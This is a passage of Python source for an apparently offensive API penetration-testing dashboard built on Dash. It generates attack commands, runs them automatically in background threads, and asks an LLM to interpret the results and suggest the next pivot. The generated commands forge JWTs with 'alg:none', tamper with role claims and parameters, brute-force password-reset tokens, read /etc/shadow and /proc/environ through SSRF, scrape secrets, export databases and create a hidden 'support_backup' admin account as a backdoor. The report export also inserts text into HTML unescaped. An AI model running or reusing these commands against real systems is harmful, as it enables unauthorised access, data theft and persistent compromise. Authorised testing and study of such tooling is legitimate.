    prompt = (f"Lateral movement command:\n```\n{cmd}\n```\nOutput:\n```\n{(output or '')[:800]}\n```\n"
              f"Explain what was found, whether lateral movement succeeded, and suggest next pivot steps.")
    try:
        return call_llm(prompt)
    except Exception as e:
        return f"LLM error: {e}"


# ═══════════════════════════════════════════════════════════════════════════════
# PRIVILEGE ESCALATION CALLBACKS
# ═══════════════════════════════════════════════════════════════════════════════

@callback(
    Output("privesc-cmd", "value"),
    Input("privesc-build-btn", "n_clicks"),
    State("privesc-token",     "value"),
    State("privesc-target",    "value"),
    State("privesc-technique", "value"),
    prevent_initial_call=True,
)
def build_privesc_cmd(n, token, target, technique):
    if not n:
        raise PreventUpdate
    tok = (token or "LOW_PRIV_TOKEN").strip()
    tgt = (target or "http://target/api/admin").strip()

    if technique == "jwt_none":
        return (f"# JWT alg:none — forge admin token\npython3 << 'EOF'\n"
                f"import base64, json, requests\n"
                f"header  = base64.b64encode(b'{{\"alg\":\"none\",\"typ\":\"JWT\"}}').decode().rstrip('=')\n"
                f"payload = base64.b64encode(b'{{\"sub\":\"1\",\"role\":\"admin\",\"iat\":9999999999}}').decode().rstrip('=')\n"
                f"forged  = f'{{header}}.{{payload}}.'\n"
                f"r = requests.get('{tgt}', headers={{'Authorization': f'Bearer {{forged}}'}})\n"
                f"print(r.status_code, r.text[:500])\nEOF")
    elif technique == "jwt_claim":
        return (f"# JWT Claim escalation — modify role field\n"
                f"pip install pyjwt 2>/dev/null\n"
                f"python3 -c \"\nimport jwt\n"
                f"decoded = jwt.decode('{tok}', options={{'verify_signature':False}})\n"
                f"decoded['role'] = 'admin'; decoded['isAdmin'] = True\n"
                f"# Re-sign with known/guessed secret\n"
                f"forged = jwt.encode(decoded, 'secret', algorithm='HS256')\n"
                f"print(forged)\"")
    elif technique == "param_tamper":
        return (f"# Parameter Tampering\n"
                f"curl -s '{tgt}?admin=true&role=admin&privileged=1' "
                f"-H 'Authorization: Bearer {tok[:40]}'\n"
                f"curl -s '{tgt}?isAdmin=1&bypass=true' "
                f"-H 'Authorization: Bearer {tok[:40]}'")
    elif technique == "mass_assign":
        return (f"# Mass Assignment — inject role fields in POST\n"
                f"curl -s -X POST '{tgt}' "
                f"-H 'Authorization: Bearer {tok[:40]}' "
                f"-H 'Content-Type: application/json' "
                f"-d '{{\"isAdmin\":true,\"role\":\"admin\",\"privileged\":true}}'")
    elif technique == "verb_tamper":
        return (f"# HTTP Verb Tampering\n"
                f"for VERB in GET POST PUT PATCH DELETE OPTIONS HEAD; do\n"
                f"  echo \"--- $VERB ---\"\n"
                f"  curl -s -X $VERB '{tgt}' -H 'Authorization: Bearer {tok[:40]}' "
                f"-w '\\nHTTP: %{{http_code}}\\n'\ndone")
    elif technique == "acct_takeover":
        return (f"# Account Takeover — predict/reuse password reset token\n"
                f"# Step 1: trigger reset\ncurl -s -X POST '{tgt.replace('/admin','/reset')}' "
                f"-d '{{\"email\":\"admin@target.com\"}}'\n"
                f"# Step 2: try sequential/weak tokens\n"
                f"for tok in 1234 0000 admin $(date +%s); do\n"
                f"  CODE=$(curl -s -o /dev/null -w '%{{http_code}}' "
                f"'{tgt.replace('/admin','/reset/confirm')}?token='$tok)\n"
                f"  echo \"token=$tok → $CODE\"\ndone")
    return f"# PrivEsc PoC for {technique}"


@callback(
    Output("privesc-output", "value"),
    Input("privesc-run-btn", "n_clicks"),
    State("privesc-cmd", "value"),
    prevent_initial_call=True,
)
def run_privesc(n, cmd):
    if not n or not cmd:
        raise PreventUpdate
    threading.Thread(target=_phase_run_bg, args=("privesc", cmd), daemon=True).start()
    return f"$ {cmd}\n[Running…]"


@callback(
    Output("privesc-ai-out", "children"),
    Input("privesc-ai-btn", "n_clicks"),
    State("privesc-cmd", "value"),
    State("privesc-output", "value"),
    prevent_initial_call=True,
)
def privesc_ai(n, cmd, output):
    if not n:
        raise PreventUpdate
    prompt = (f"PrivEsc PoC:\n```\n{cmd}\n```\nOutput:\n```\n{(output or '')[:800]}\n```\n"
              f"Explain: 1) Did escalation succeed? 2) What access was gained? "
              f"3) CVSS score estimate with justification. 4) Exact remediation.")
    try:
        return call_llm(prompt)
    except Exception as e:
        return f"LLM error: {e}"


# ═══════════════════════════════════════════════════════════════════════════════
# POST-EXPLOITATION CALLBACKS
# ═══════════════════════════════════════════════════════════════════════════════

@callback(
    Output("postex-cmd", "value"),
    Input("postex-build-btn", "n_clicks"),
    State("postex-token",  "value"),
    State("postex-base",   "value"),
    State("postex-action", "value"),
    prevent_initial_call=True,
)
def build_postex_cmd(n, token, base, action):
    if not n:
        raise PreventUpdate
    tok = token or "ADMIN_TOKEN"
    url = base or "http://target/api"

    if action == "enum_users":
        return (f"# Enumerate all users\n"
                f"for PAGE in $(seq 0 10); do\n"
                f"  curl -s '{url}/users?page=$PAGE&limit=100' "
                f"-H 'Authorization: Bearer {tok[:40]}'\ndone")
    elif action == "dump_all":
        return (f"# Dump all resources\n"
                f"for EP in users products orders items settings config; do\n"
                f"  echo \"=== $EP ===\"\n"
                f"  curl -s '{url}/'$EP -H 'Authorization: Bearer {tok[:40]}' "
                f"| python3 -m json.tool 2>/dev/null | head -50\ndone")
    elif action == "extract_secrets":
        return (f"# Extract secrets from all endpoints\n"
                f"curl -s '{url}/settings' -H 'Authorization: Bearer {tok[:40]}' "
                f"| python3 -c \"\nimport sys,json,re\nd=sys.stdin.read()\n"
                f"for kw in ['password','secret','key','token','api']:\n"
                f"    for m in re.finditer(rf'{{kw}}[^\\\"]*:\\\"([^\\\"]+)\\\"',d,re.I):\n"
                f"        print(f'{{kw}}: {{m.group(1)}}')\n\"")
    elif action == "ssrf_read":
        return (f"# SSRF file read via API\n"
                f"curl -s '{url}?url=file:///etc/passwd'\n"
                f"curl -s '{url}?url=file:///etc/shadow'\n"
                f"curl -s '{url}?url=file:///proc/environ'")
    elif action == "backdoor":
        return (f"# Create backdoor admin account\n"
                f"curl -s -X POST '{url}/users' "
                f"-H 'Authorization: Bearer {tok[:40]}' "
                f"-H 'Content-Type: application/json' "
                f"-d '{{\"username\":\"support_backup\",\"password\":\"P@ssw0rd123!\","
                f"\"role\":\"admin\",\"email\":\"backup@legit.com\"}}'")
    elif action == "db_export":
        return (f"# Database export via API\n"
                f"curl -s '{url}/export?format=csv' "
                f"-H 'Authorization: Bearer {tok[:40]}' -o /tmp/db_export.csv\n"
                f"wc -l /tmp/db_export.csv\nhead -5 /tmp/db_export.csv")
    return f"# Post-ex {action}"


@callback(
    Output("postex-output", "value"),
    Input("postex-run-btn", "n_clicks"),
    State("postex-cmd", "value"),
    prevent_initial_call=True,
)
def run_postex(n, cmd):
    if not n or not cmd:
        raise PreventUpdate
    threading.Thread(target=_phase_run_bg, args=("postex", cmd), daemon=True).start()
    return f"$ {cmd}\n[Running…]"


@callback(
    Output("postex-ai-out", "children"),
    Input("postex-ai-btn", "n_clicks"),
    State("postex-cmd", "value"),
    State("postex-output", "value"),
    prevent_initial_call=True,
)
def postex_ai(n, cmd, output):
    if not n:
        raise PreventUpdate
    prompt = (f"Post-exploitation command:\n```\n{cmd}\n```\nOutput:\n```\n{(output or '')[:800]}\n```\n"
              f"Summarise what data was extracted, business impact, and recommend cleanup steps.")
    try:
        return call_llm(prompt)
    except Exception as e:
        return f"LLM error: {e}"


# ═══════════════════════════════════════════════════════════════════════════════
# CLEANUP CALLBACKS
# ═══════════════════════════════════════════════════════════════════════════════

@callback(
    Output("cleanup-artifact-list", "children"),
    Input("api-phase-tabs", "active_tab"),
    State("api-artifacts", "data"),
)
def show_cleanup_list(tab, artifacts):
    if tab != "phase-cleanup":
        raise PreventUpdate
    items = artifacts or []
    if not items:
        return html.Div("No tracked artefacts yet.",
                        style={"color": "#636e72", "fontSize": "12px"})
    return html.Ul([html.Li(a, style={"color": "#b0b0b0", "fontSize": "12px"})
                    for a in items])


@callback(
    Output("cleanup-cmd", "value"),
    Input("cleanup-build-btn", "n_clicks"),
    State("api-artifacts", "data"),
    State("api-scan-id", "data"),
    prevent_initial_call=True,
)
def build_cleanup_cmd(n, artifacts, scan_id):
    if not n:
        raise PreventUpdate
    with _LOCK:
        findings = list(_RESULTS.get(scan_id or "", []))
    lines = ["#!/bin/bash", "# Auto-generated cleanup script", ""]
    if artifacts:
        lines.append("# Remove tracked test artefacts")
        for a in artifacts:
            lines.append(f"# TODO: delete {a}")
    lines += [
        "",
        "# Revoke any test tokens/sessions",
        "# curl -X DELETE 'http://target/api/tokens/test_token'",
        "",
        "# Delete test accounts created",
        "# curl -X DELETE 'http://target/api/users/support_backup' -H 'Authorization: Bearer ADMIN'",
        "",
        "# Clear uploaded test files",
        "rm -f /tmp/asrep_users*.txt /tmp/hashes.* /tmp/nikto_out.txt /tmp/db_export.csv",
        "",
        "echo 'Cleanup complete'",
    ]
    return "\n".join(lines)


@callback(
    Output("cleanup-output", "value"),
    Input("cleanup-run-btn", "n_clicks"),
    State("cleanup-cmd", "value"),
    prevent_initial_call=True,
)
def run_cleanup(n, cmd):
    if not n or not cmd:
        raise PreventUpdate
    threading.Thread(target=_phase_run_bg, args=("cleanup", cmd), daemon=True).start()
    return f"$ {cmd}\n[Running…]"


@callback(
    Output("cleanup-ai-out", "children"),
    Input("cleanup-ai-btn", "n_clicks"),
    State("cleanup-cmd", "value"),
    prevent_initial_call=True,
)
def cleanup_ai(n, cmd):
    if not n:
        raise PreventUpdate
    prompt = (f"Verify this pentest cleanup script is complete and doesn't miss anything:\n"
              f"```bash\n{cmd}\n```\n"
              f"List any missing cleanup steps and potential liability if artefacts are left behind.")
    try:
        return call_llm(prompt)
    except Exception as e:
        return f"LLM error: {e}"


# ═══════════════════════════════════════════════════════════════════════════════
# REPORT CALLBACKS
# ═══════════════════════════════════════════════════════════════════════════════

@callback(
    Output("report-output",   "children"),
    Input("report-gen-btn",   "n_clicks"),
    State("api-scan-id",      "data"),
    State("report-engagement","value"),
    State("report-tester",    "value"),
    State("report-date",      "value"),
    State("report-sections",  "value"),
    prevent_initial_call=True,
)
def generate_report(n, scan_id, engagement, tester, date, sections):
    if not n:
        raise PreventUpdate
    sections = sections or []
    with _LOCK:
        findings = list(_RESULTS.get(scan_id or "", []))

    sev_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}
    findings.sort(key=lambda f: sev_order.get(f["severity"], 5))
    counts = {s: sum(1 for f in findings if f["severity"] == s)
              for s in ["Critical", "High", "Medium", "Low", "Info"]}

    # Build prompt
    findings_summary = "\n".join(
        f"| {f['severity']} | {f['check'].upper()} | {f['name']} | {f['detail'][:80]} |"
        for f in findings[:30]
    ) or "| — | No findings recorded |"

    prompt = (
        f"You are writing a professional API penetration test report.\n"
        f"Engagement: {engagement or 'API Security Assessment'}\n"
        f"Tester: {tester or 'Security Team'}\n"
        f"Date: {date}\n"
        f"Findings: {counts['Critical']} Critical, {counts['High']} High, "
        f"{counts['Medium']} Medium, {counts['Low']} Low\n\n"
        f"Findings table:\n| Severity | Check | Name | Detail |\n|---|---|---|---|\n"
        f"{findings_summary}\n\n"
        f"Write a full markdown pentest report with these sections: "
        f"{', '.join(sections)}.\n"
        f"Include: executive summary with business risk, detailed technical findings, "
        f"CVSS scores, step-by-step reproduction, and remediation roadmap prioritised by severity."
    )

    try:
        md_text = call_llm(prompt)
    except Exception as e:
        md_text = f"LLM error: {e}"

    # Render markdown as plain text (formatted)
    return html.Pre(md_text, style={"color": "#b0b0b0", "fontSize": "12px",
                                     "whiteSpace": "pre-wrap"})


@callback(
    Output("report-download", "data"),
    Input("report-export-btn", "n_clicks"),
    State("report-output",     "children"),
    State("report-engagement", "value"),
    prevent_initial_call=True,
)
def export_report(n, content, engagement):
    if not n or not content:
        raise PreventUpdate
    text = ""
    if isinstance(content, dict):
        text = content.get("props", {}).get("children", "")
    elif isinstance(content, str):
        text = content
    html_content = (
        "<html><head><style>"
        "body{font-family:monospace;background:#0d0d0d;color:#e0e0e0;padding:40px;}"
        "h1,h2,h3{color:#ff6b35;}table{border-collapse:collapse;width:100%;}"
        "td,th{border:1px solid #333;padding:8px;}"
        "</style></head><body><pre>" + text + "</pre></body></html>"
    )
    fname = f"pentest_report_{(engagement or 'api').replace(' ','_')}.html"
    return dcc.send_string(html_content, fname)
